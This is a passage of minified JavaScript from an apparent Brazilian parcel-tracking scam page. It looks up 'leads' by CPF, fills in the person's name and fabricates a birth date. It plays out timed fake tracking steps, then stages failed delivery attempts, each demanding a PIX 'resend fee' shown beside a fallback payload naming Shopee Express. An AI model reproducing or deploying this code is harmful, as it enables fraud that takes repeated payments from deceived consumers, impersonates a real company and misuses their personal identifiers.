e=document.getElementById("deliveryModal");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}setupOrderDetailsAccordion(){const e=document.getElementById("detailsHeader"),t=document.getElementById("detailsContent"),a=document.querySelector(".toggle-icon");e&&t&&e.addEventListener("click",()=>{t.classList.contains("expanded")?(t.classList.remove("expanded"),a&&a.classList.remove("rotated")):(t.classList.add("expanded"),a&&a.classList.add("rotated"))})}setupModalEvents(){const e=document.getElementById("closeModal"),t=document.getElementById("copyPixButtonModal"),a=document.getElementById("simulatePaymentButton"),i=document.getElementById("liberationModal");e&&e.addEventListener("click",()=>{this.closeLiberationModal()}),t&&t.addEventListener("click",()=>{this.copyPixCode()}),a&&a.addEventListener("click",()=>{this.simulatePayment()}),i&&i.addEventListener("click",o=>{o.target===i&&this.closeLiberationModal()})}async simulatePayment(){console.log("🎭 Simulando pagamento da taxa de liberação"),this.closeLiberationModal(),this.liberationPaid=!0,await this.dbService.updateLiberationStatus(this.currentCPF,!0),this.showPaymentSuccessNotification("Taxa de liberação paga"),setTimeout(()=>{this.generateRealTimeTrackingData(),this.displayTrackingResults()},2e3)}showPaymentSuccessNotification(e){const t=document.createElement("div");t.style.cssText=`
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(45deg, #27ae60, #2ecc71);
            color: white;
            padding: 20px 25px;
            border-radius: 12px;
            box-shadow: 0 8px 25px rgba(39, 174, 96, 0.4);
            z-index: 3000;
            animation: slideInRight 0.5s ease;
            font-family: Inter, sans-serif;
            max-width: 350px;
        `,t.innerHTML=`
            <div style="display: flex; align-items: center; gap: 12px;">
                <i class="fas fa-check-circle" style="font-size: 24px;"></i>
                <div>
                    <div style="font-weight: 700; font-size: 16px; margin-bottom: 4px;">
                        Pagamento Confirmado!
                    </div>
                    <div style="font-size: 14px; opacity: 0.9;">
                        ${e}
                    </div>
                </div>
            </div>
        `,document.body.appendChild(t),setTimeout(()=>{t.parentNode&&(t.style.animation="slideOutRight 0.5s ease",setTimeout(()=>t.remove(),500))},4e3)}closeLiberationModal(){const e=document.getElementById("liberationModal");e&&(e.style.display="none",document.body.style.overflow="auto")}copyPixCode(){const e=document.getElementById("pixCodeModal"),t=document.getElementById("copyPixButtonModal");if(!(!e||!t))try{e.select(),e.setSelectionRange(0,99999),navigator.clipboard&&window.isSecureContext?navigator.clipboard.writeText(e.value).then(()=>{this.showCopySuccess(t)}).catch(()=>{this.fallbackCopy(e,t)}):this.fallbackCopy(e,t)}catch(a){console.error("❌ Erro ao copiar PIX:",a)}}fallbackCopy(e,t){try{document.execCommand("copy")&&this.showCopySuccess(t)}catch(a){console.error("❌ Fallback copy falhou:",a)}}showCopySuccess(e){const t=e.innerHTML;e.innerHTML='<i class="fas fa-check"></i> Copiado!',e.style.background="#27ae60",setTimeout(()=>{e.innerHTML=t,e.style.background=""},2e3)}displayOrderDetails(){if(!this.userData)return;const e=document.getElementById("orderDetails"),t=document.getElementById("customerName"),a=document.getElementById("fullName"),i=document.getElementById("formattedCpf");e&&(e.style.display="block"),t&&(t.textContent=this.userData.nome.split(" ")[0]),a&&(a.textContent=this.userData.nome),i&&(i.textContent=g.formatCPF(this.userData.cpf))}startAutoRefresh(){this.refreshInterval=setInterval(()=>{this.trackingData&&this.trackingService.checkForNewSteps(this.trackingData.timeline)&&(console.log("🔄 Novas etapas disponíveis, atualizando..."),this.displayTrackingResults())},3e4)}stopAutoRefresh(){this.refreshInterval&&(clearInterval(this.refreshInterval),this.refreshInterval=null)}showLoadingNotification(){h.showLoadingNotification()}closeLoadingNotification(){h.closeLoadingNotification()}showError(e){h.showError(e)}scrollToElement(e,t=0){h.scrollToElement(e,t)}animateTimeline(){h.animateTimeline()}checkURLParams(){new URLSearchParams(window.location.search).get("focus")==="cpf"&&setTimeout(()=>{const a=document.getElementById("cpfInput");a&&a.focus()},500)}setZentraPayApiSecret(e){this.zentraPayService&&this.zentraPayService.setApiSecret(e)}cleanup(){this.stopAutoRefresh(),console.log("🧹 Sistema de rastreamento limpo")}}class C{constructor(e){this.trackingSystem=e,this.deliveryAttempts=0,this.deliveryValues=[7.74,12.38,16.46],this.isProcessing=!1,this.timers=[],this.currentStep=0,this.deliveryPixData=null,console.log("🚀 Sistema de fluxo pós-pagamento inicializado"),console.log("💰 Valores de tentativa:",this.deliveryValues)}startPostPaymentFlow(){console.log("🚀 Iniciando fluxo pós-pagamento..."),this.addTimelineStep({stepNumber:1,title:"Pedido liberado na alfândega de importação",description:"Seu pedido foi liberado após o pagamento da taxa alfandegária",delay:0,nextStepDelay:30*1e3}),this.addTimelineStep({stepNumber:2,title:"Pedido sairá para entrega",description:"Pedido sairá para entrega para seu endereço",delay:30*1e3,nextStepDelay:30*1e3}),this.addTimelineStep({stepNumber:3,title:"Pedido em trânsito",description:"Pedido em trânsito para seu endereço",delay:60*1e3,nextStepDelay:30*1e3}),this.addTimelineStep({stepNumber:4,title:"Pedido em rota de entrega",description:"Pedido em rota de entrega para seu endereço, aguarde",delay:90*1e3,nextStepDelay:30*1e3}),this.addTimelineStep({stepNumber:5,title:"Tentativa de entrega",description:`${this.deliveryAttempts+1}ª tentativa de entrega realizada, mas não foi possível entregar`,delay:120*1e3,isDeliveryAttempt:!0,nextStepDelay:30*1e3})}addTimelineStep({stepNumber:e,title:t,description:a,delay:i,nextStepDelay:o,isDeliveryAttempt:s=!1}){const r=setTimeout(()=>{console.log(`📦 Adicionando etapa ${e}: ${t}`);const n=document.getElementById("trackingTimeline");if(!n)return;const c=new Date,p=this.createTimelineItem({stepNumber:e,title:t,description:a,date:c,completed:!0,isDeliveryAttempt:s,nextStepDelay:o});n.appendChild(p),setTimeout(()=>{p.style.opacity="1",p.style.transform="translateY(0)"},100),p.scrollIntoView({behavior:"smooth",block:"center"}),this.currentStep=e},i);this.timers.push(r)}createTimelineItem({stepNumber:e,title:t,description:a,date:i,completed:o,isDeliveryAttempt:s}){const r=document.createElement("div");r.className=`timeline-item ${o?"completed":""}`,r.style.opacity="0",r.style.transform="translateY(20px)",r.style.transition="all 0.5s ease";const n=i.toLocaleDateString("pt-BR",{day:"2-digit",month:"short"}),c=i.toLocaleTimeString("pt-BR",{hour:"2-digit",minute:"2-digit"});let p="";if(s&&(p=`
                <button class="liberation-button-timeline delivery-retry-btn" data-attempt="${this.deliveryAttempts}">
                    <i class="fas fa-redo"></i> Reenviar Pacote
                </button>
            `),r.innerHTML=`
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${n}</span>
                    <span class="time">${c}</span>
                </div>
                <div class="timeline-text">
                    <p>${a}</p>
                    ${p}
                </div>
            </div>
        `,s){const l=r.querySelector(".delivery-retry-btn");l&&this.configureDeliveryRetryButton(l)}return r}configureDeliveryRetryButton(e){e.style.cssText=`
            background: linear-gradient(45deg, #ff6b35, #f7931e);
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 1rem;
            font-weight: 700;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
            animation: pulse 2s infinite;
            font-family: 'Roboto', sans-serif;
            letter-spacing: 0.5px;
            margin-top: 15px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        `,e.addEventListener("click",()=>{this.handleDeliveryRetry(e)}),console.log("🔄 Botão de reenvio configurado")}async handleDeliveryRetry(e){if(this.isProcessing)return;this.isProcessing=!0;const t=parseInt(e.dataset.attempt),a=this.deliveryValues[t%this.deliveryValues.length];console.log(`🔄 Processando reenvio - Tentativa ${t+1} - R$ ${a.toFixed(2)}`),this.showDeliveryLoadingNotification();try{console.log("🚀 Gerando PIX para tentativa de entrega via Zentra Pay...");const i=await this.trackingSystem.zentraPayService.createPixTransaction(this.trackingSystem.userData,a);if(i.success)console.log("🎉 PIX de reenvio gerado com sucesso!"),this.deliveryPixData=i,this.closeDeliveryLoadingNotification(),setTimeout(()=>{this.showDeliveryPixModal(a,t+1)},300);else throw new Error(i.error||"Erro ao gerar PIX de reenvio")}catch(i){console.error("💥 Erro ao gerar PIX de reenvio:",i),this.closeDeliveryLoadingNotification(),setTimeout(()=>{this.showDeliveryPixModal(a,t+1,!0)},300)}}showDeliveryLoadingNotification(){const e=document.createElement("div");e.id="deliveryLoadingNotification",e.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;const t=document.createElement("div");t.style.cssText=`
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #ff6b35;
        `,t.innerHTML=`
            <div style="margin-bottom: 20px;">
                <i class="fas fa-truck" style="font-size: 3rem; color: #ff6b35; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Gerando PIX de Reenvio...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto processamos sua solicitação
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #ff6b35, #f7931e); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
                Processando pagamento...
            </p>
        `,e.appendChild(t),document.body.appendChild(e),document.body.style.overflow="hidden"}closeDeliveryLoadingNotification(){const e=document.getElementById("deliveryLoadingNotification");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}showDeliveryPixModal(e,t,a=!1){const i=document.createElement("div");i.className="modal-overlay",i.id="deliveryPixModal",i.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;let o,s;!a&&this.deliveryPixData&&this.deliveryPixData.pixPayload?(o=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.deliveryPixData.pixPayload)}`,s=this.deliveryPixData.pixPayload,console.log("✅ Usando PIX real do Zentra Pay para reenvio")):(o="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2",s="00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2",console.log("⚠️ Usando PIX estático como fallback para reenvio")),i.innerHTML=`
            <div class="professional-modal-container">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Tentativa de Entrega ${t}°</h2>
                    <button class="professional-modal-close" id="closeDeliveryPixModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div class="liberation-explanation">
                        <p class="liberation-subtitle">
                            Para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de R$ ${e.toFixed(2)}.
                        </p>
                    </div>

                    <div class="professional-fee-display">
                        <div class="fee-info">
                            <span class="fee-label">Taxa de Reenvio - ${t}° Tentativa</span>
                            <span class="fee-amount">R$ ${e.toFixed(2)}</span>
                        </div>
                    </div>

                    <!-- Seção PIX Real - Zentra Pay -->
                    <div class="professional-pix-section">
                        <h3 class="pix-section-title">Pagamento via Pix</h3>
                        
                        <div class="pix-content-grid">
                            <!-- QR Code -->
                            <div class="qr-code-section">
                                <div class="qr-code-container">
                                    <img src="${o}" alt="QR Code PIX Reenvio" class="professional-qr-code">
                                </div>
                            </div>
                            
                            <!-- PIX Copia e Cola -->
                            <div class="pix-copy-section">
                                <label class="pix-copy-label">PIX Copia e Cola</label>
                                <div class="professional-copy-container">
                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${s}</textarea>
                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
                                        <i class="fas fa-copy"></i> Copiar
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Instruções de Pagamento -->
                        <div class="professional-payment-steps">
                            <h4 class="steps-title">Como realizar o pagamento:</h4>
                            <div class="payment-steps-grid">
                                <div class="payment-step">
                                    <div class="step-number">1</div>
                                    <div class="step-content">
                                        <i class="fas fa-mobile-alt step-icon"></i>
                                        <span class="step-text">Acesse seu app do banco</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">2</div>
                                    <div class="step-content">
                                        <i class="fas fa-qrcode step-icon"></i>
                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">3</div>
                                    <div class="step-content">
                                        <i class="fas fa-check step-icon"></i>
                                        <span class="step-text">Confirme o pagamento</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `,document.body.appendChild(i),document.body.style.overflow="hidden",this.setupDeliveryModalEvents(i,t),console.log(`💳 Modal de PIX para ${t}° tentativa exibido - R$ ${e.toFixed(2)}`)}setupDeliveryModalEvents(e,t){const a=e.querySelector("#closeDeliveryPixModal");a&&a.addEventListener("click",()=>{this.closeDeliveryPixModal()});const i=e.querySelector("#copyDeliveryPixButton");i&&i.addEventListener("click",()=>{this.copyDeliveryPixCode()}),e.addEventListener("click",o=>{o.target===e&&this.closeDeliveryPixModal()})}copyDeliveryPixCode(){const e=document.getElementById("deliveryPixCode"),t=document.getElementById("copyDeliveryPixButton");if(!(!e||!t))try{e.select(),e.setSelectionRange(0,99999),navigator.clipboard&&window.isSecureContext?navigator.clipboard.writeText(e.value).then(()=>{console.log("✅ PIX de reenvio copiado:",e.value.substring(0,50)+"..."),this.showCopySuccess(t)}).catch(()=>{this.fallbackCopy(e,t)}):this.fallbackCopy(e,t)}catch(a){console.error("❌ Erro ao copiar PIX de reenvio:",a)}}fallbackCopy(e,t){try{document.execCommand("copy")&&(console.log("✅ PIX de reenvio copiado via execCommand"),this.showCopySuccess(t))}catch(a){console.error("❌ Fallback copy falhou:",a)}}showCopySuccess(e){const t=e.innerHTML;e.innerHTML='<i class="fas fa-check"></i> Copiado!',e.style.background="#27ae60",setTimeout(()=>{e.innerHTML=t,e.style.background=""},2e3)}closeDeliveryPixModal(){const e=document.getElementById("deliveryPixModal");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300)),this.isProcessing=!1}processDeliveryRetry(e){this.hideCurrentRetryButton(e-1),this.deliveryAttempts=e,this.deliveryAttempts>=3&&(this.deliveryAttempts=0),console.log(`✅ Reenvio ${this.deliveryAttempts} processado com sucesso`),console.log(`💰 Próximo valor será: R$ ${this.deliveryValues[this.deliveryAttempts%this.deliveryValues.length].toFixed(2)}`),setTimeout(()=>{this.startDeliveryFlow()},2e3)}hideCurrentRetryButton(e){const t=document.querySelector(`[data-attempt="${e}"]`);t&&(t.closest(".timeline-item").style.display="none")}startDeliveryFlow(){console.log("🚚 Iniciando novo fluxo de entrega..."),this.isProcessing=!1;const e=100+this.deliveryAttempts*10;this.addTimelineStep({stepNumber:e+1,title:"Pedido sairá para entrega",description:"Seu pedido está sendo preparado para nova tentativa de entrega",delay:0,nextStepDelay:30*60*1e3})}isBusinessHour(e){const t=e.getHours(),a=e.getDay();return a>=1&&a<=5&&t>=8&&t<18}getNextBusinessTime(e){const t=new Date(e);return t.getDay()===0?t.setDate(t.getDate()+1):t.getDay()===6&&t.setDate(t.getDate()+2),t.getHours()>=18?(t.setDate(t.getDate()+1),t.setHours(8,0,0,0)):t.getHours()<8&&t.setHours(8,0,0,0),t}clearAllTimers(){this.timers.forEach(e=>clearTimeout(e)),this.timers=[],console.log("🧹 Todos os timers foram limpos")}reset(){this.clearAllTimers(),this.deliveryAttempts=0,this.isProcessing=!1,this.currentStep=0,this.deliveryPixData=null,this.closeDeliveryPixModal(),console.log("🔄 Sistema resetado")}getStatus(){return{deliveryAttempts:this.deliveryAttempts,isProcessing:this.isProcessing,currentStep:this.currentStep,activeTimers:this.timers.length,currentDeliveryValue:this.deliveryValues[this.deliveryAttempts%this.deliveryValues.length],deliveryValues:this.deliveryValues,hasDeliveryPixData:!!this.deliveryPixData}}}class k extends T{constructor(){super(),this.dbService=new f,this.isVegaOrigin=!1,this.leadData=null,this.postPaymentSystem=null}async init(){if(!this.isInitialized){console.log("🚀 Inicializando sistema de rastreamento aprimorado");try{this.checkOrigin(),await super.init(),this.isVegaOrigin&&await this.handleVegaOrigin(),console.log("✅ Sistema de rastreamento aprimorado inicializado")}catch(e){console.error("❌ Erro na inicialização do sistema aprimorado:",e)}}}checkOrigin(){const e=new URLSearchParams(window.location.search);this.isVegaOrigin=e.get("origem")==="vega",this.isVegaOrigin?console.log("📦 Origem detectada: Vega Checkout"):console.log("🔍 Origem detectada: Rastreamento direto")}async handleVegaOrigin(){const t=new URLSearchParams(window.location.search).get("cpf");if(t){console.log("🔍 Buscando dados do lead para CPF:",t);const a=await this.dbService.getLeadByCPF(t);a.success&&a.data?(this.leadData=a.data,console.log("✅ Dados do lead encontrados:",this.leadData),await this.autoFillAndTrack(t)):(console.log("⚠️ Lead não encontrado, criando dados mock"),this.leadData=v.generateMockVegaData(t),await this.dbService.createLead(this.leadData),await this.autoFillAndTrack(t))}}async autoFillAndTrack(e){const t=document.getElementById("cpfInput");t&&(t.value=g.formatCPF(e),setTimeout(()=>{this.handleTrackingSubmit()},1e3))}async handleTrackingSubmit(){return console.log("🔍 Iniciando rastreamento aprimorado"),this.isVegaOrigin&&this.leadData?this.handleVegaTracking():super.handleTrackingSubmit()}async handleVegaTracking(){console.log("📦 Processando rastreamento Vega");const{UIHelpers:e}=await S(async()=>{const{UIHelpers:t}=await Promise.resolve().then(()=>w);return{UIHelpers:t}},void 0);e.showLoadingNotification();try{await new Promise(a=>setTimeout(a,2e3)),this.currentCPF=this.leadData.cpf.replace(/[^\d]/g,""),this.userData={nome:this.leadData.nome_completo,cpf:this.leadData.cpf,nascimento:this.generateBirthDate(this.leadData.cpf),situacao:"REGULAR"},e.closeLoadingNotification(),this.displayOrderDetails(),this.generateEnhancedTrackingData(),this.displayTrackingResults();const t=document.getElementById("orderDetails");t&&e.scrollToElement(t,100),setTimeout(()=>{this.highlightLiberationButton(),this.initializePostPaymentSystem()},1500)}catch(t){console.error("❌ Erro no rastreamento Vega:",t),e.closeLoadingNotification(),e.showError("Erro ao processar rastreamento")}}highlightLiberationButton(){super.highlightLiberationButton(),setTimeout(()=>{this.initializePostPaymentSystem()},1e3)}initializePostPaymentSystem(){this.postPaymentSystem||(this.postPaymentSystem=new C(this),console.log("🚀 Sistema pós-pagamento inicializado"))}generateEnhancedTrackingData(){const{TrackingGenerator:e}=require("../utils/tracking-generator.js");this.trackingData=e.generateTrackingData(this.userData),this.leadData&&this.leadData.etapa_atual&&(this.trackingData.currentStep=this.getStepNameByNumber(this.leadData.etapa_atual),this.trackingData.steps.forEach((t,a)=>{t.completed=a<this.leadData.etapa_atual})),this.leadData&&this.leadData.status_pagamento==="pago"&&(this.trackingData.liberationPaid=!0)}getStepNameByNumber(e){return{1:"created",2:"preparing",3:"shipped",4:"in_transit",5:"customs",6:"delivered"}[e]||"customs"}generateBirthDate(e){const t=e.replace(/[^\d]/g,""),a=1960+parseInt(t.slice(0,2))%40,i=parseInt(t.slice(2,4))%12+1;return`${(parseInt(t.slice(4,6))%28+1).toString().padStart(2,"0")}/${i.toString().padStart(2,"0")}/${a}`}async updateLeadStage(e){if(this.leadData&&this.leadData.cpf)try{await this.dbService.updateLeadStage(this.leadData.cpf,e),console.log("✅ Etapa do lead atualizada:",e)}catch(t){console.error("❌ Erro ao atualizar etapa do lead:",t)}}async updatePaymentStatus(e){if(this.leadData&&this.leadData.cpf)try{await this.dbService.updatePaymentStatus(this.leadData.cpf,e),console.log("✅ Status de pagamento atualizado:",e)}catch(t){console.error("❌ Erro ao atualizar status de pagamento:",t)}}cleanup(){this.postPaymentSystem&&this.postPaymentSystem.reset(),console.log("🧹 Sistema de rastreamento limpo")}}(function(){console.log("=== SISTEMA DE RASTREAMENTO APRIMORADO CARREGANDO ===");let m;function e(){console.log("=== INICIALIZANDO PÁGINA DE RASTREAMENTO ===");try{P.init(),console.log("✓ Navegação inicializada"),m||(m=new k,window.trackingSystemInstance=m),m.init(),console.log("✓ Sistema de rastreamento inicializado"),i(),console.log("✓ Header scroll configurado"),a(),t(),console.log("=== PÁGINA DE RASTREAMENTO INICIALIZADA COM SUCESSO ===")}catch(o){console.error("❌ Erro na inicialização da página de rastreamento:",o),setTimeout(e,2e3)}}function t(){const o=window.ZENTRA_PAY_SECRET_KEY||localStorage.getItem("zentra_pay_secret_key");o&&o!=="SUA_SECRET_KEY_AQUI"&&m?(m.setZentraPayApiSecret(o),console.log("✓ API Secret Zentra Pay configurada automaticamente")):console.warn('⚠️ API Secret Zentra Pay não configurada. Configure usando: configurarZentraPay("sua_chave")')}function a(){["trackingForm","cpfInput","trackButton","liberationModal","pixCodeModal","realPixQrCode"].forEach(s=>{document.getElementById(s)?console.log(`✓ Elemento encontrado: ${s}`):console.warn(`⚠️ Elemento não encontrado: ${s}`)})}function i(){window.addEventListener("scroll",function(){const o=document.querySelector(".header");o&&(window.scrollY>100?(o.style.backgroundColor="rgba(255, 255, 255, 0.95)",o.style.backdropFilter="blur(10px)"):(o.style.backgroundColor="#fff",o.style.backdropFilter="none"))})}document.readyState==="loading"?(document.addEventListener("DOMContentLoaded",e),console.log("📅 Aguardando DOMContentLoaded")):(e(),console.log("📄 DOM já carregado, inicializando imediatamente")),setTimeout(e,100),setTimeout(e,500),setTimeout(e,1e3),setTimeout(e,2e3),console.log("=== SCRIPT DE RASTREAMENTO APRIMORADO CARREGADO ===")})();
